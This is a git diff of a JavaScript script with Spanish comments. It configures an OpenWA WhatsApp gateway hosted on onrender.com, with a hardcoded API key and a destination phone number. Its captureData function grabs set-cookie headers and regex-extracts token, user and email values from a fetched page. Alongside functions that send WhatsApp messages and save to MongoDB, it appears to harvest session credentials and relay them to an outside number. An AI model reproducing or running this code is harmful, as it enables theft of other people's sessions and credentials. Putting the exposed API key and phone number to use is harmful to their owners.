@@ -8,7 +8,7 @@ const COLLECTION_NAME = "datos";
 // ===== CONFIGURACIÓN DE OPENWA (RENDER) =====
 const OPENWA_URL = "https://openwa-yosd.onrender.com/api";
 const OPENWA_API_KEY = "owa_k1_6a7d1c5c078a27fcdc15b75f0cbd0ce8d74cd0dcfdea101f7e0ea4a0cb13237c";
-const SESSION_ID = "mi-session"; // Cámbialo si usaste otro nombre
+const SESSION_ID = "mi-session";
 const DESTINO = "50672587762@c.us";
 
 // ===== FUNCIÓN PARA GUARDAR EN MONGODB =====
@@ -50,7 +50,7 @@ async function sendWhatsApp(mensaje) {
     }
 }
 
-// ===== CAPTURA DE DATOS (SIN PUPPETEER) =====
+// ===== CAPTURA DE DATOS =====
 async function captureData() {
     console.log('🌐 Capturando datos...');
     try {
@@ -58,7 +58,6 @@ async function captureData() {
         const html = await response.text();
         const cookies = response.headers.get('set-cookie') || '';
         
-        // Extraer datos básicos del HTML
         const tokenMatch = html.match(/token[:\s]+["']([^"']+)["']/i);
         const userMatch = html.match(/user[:\s]+["']([^"']+)["']/i);
         const emailMatch = html.match(/email[:\s]+["']([^"']+)["']/i);
